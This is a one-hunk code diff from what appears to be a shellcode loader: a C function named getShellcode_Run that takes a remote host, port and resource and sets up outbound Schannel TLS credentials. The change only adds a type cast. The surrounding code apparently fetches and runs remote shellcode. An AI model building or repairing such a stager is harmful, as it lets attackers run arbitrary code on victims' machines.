@@ -119,7 +119,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     // Acquire credentials handle
     SECURITY_STATUS secStatus = AcquireCredentialsHandleA(
         NULL,
-        UNISP_NAME_A,
+        (LPSTR)UNISP_NAME_A,
         SECPKG_CRED_OUTBOUND,
         NULL,
         &schannelCred,
